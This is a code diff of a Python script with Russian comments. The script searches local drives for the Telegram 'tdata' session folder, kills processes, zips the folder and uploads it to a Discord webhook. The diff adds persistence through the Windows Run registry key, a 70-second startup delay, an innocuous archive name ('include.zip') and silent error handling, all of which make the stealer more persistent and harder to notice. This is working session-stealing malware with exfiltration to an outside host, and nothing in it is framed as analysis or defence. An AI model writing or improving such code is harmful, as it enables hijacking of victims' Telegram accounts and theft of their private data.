@@ -1,16 +1,36 @@
 import os
 import time
+import sys
 import zipfile
 import shutil
 import subprocess
+import winreg
 from discord_webhook import DiscordWebhook
 
 # ======= Настройки =======
 FOLDER_NAME = 'tdata'
 SEARCH_PATHS = ['D:\\', 'C:\\']
 WEBHOOK_URL = "hook_url"
+FILE_NAME = "file_name"
+
+# ======= Автозагрузка =======
+
+def get_self_path():
+    if getattr(sys, 'frozen', False): 
+        return sys.executable
+    else:
+        return os.path.abspath(__file__)
+
+def autoStartUp(name=FILE_NAME):
+    path = get_self_path()
+    reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key, 0, winreg.KEY_SET_VALUE)
+    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, f'"{path}"')
+    winreg.CloseKey(key)
 
 # ======= Поиск папки tdata =======
+time.sleep(70)
+
 full_path = None
 for path in SEARCH_PATHS:
     for root, dirs, _ in os.walk(path):
@@ -45,7 +65,7 @@ def delete_fold():
                 os.remove(file_path)
         
 def archive_tdata():
-    archive_name = "tdata.zip"
+    archive_name = "include.zip"
     if os.path.exists(archive_name):
         os.remove(archive_name)  # Удаляем старый архив, если он есть
 
@@ -57,7 +77,7 @@ def archive_tdata():
 
 
 def send_to_discord():
-    archive_name = "tdata.zip"
+    archive_name = "include.zip"
     if not os.path.exists(archive_name):
         return
 
@@ -69,10 +89,11 @@ def send_to_discord():
     if response.status_code == 200 or response.status_code == 204:
         return 0
     else:
-        print(f"Ошибка отправки файла. Код ответа: {response.status_code}")
+        return 0
 
 # ======= Основной запуск =======
 def main():
+    autoStartUp()
     task_kill()
     delete_fold()
     archive_tdata()
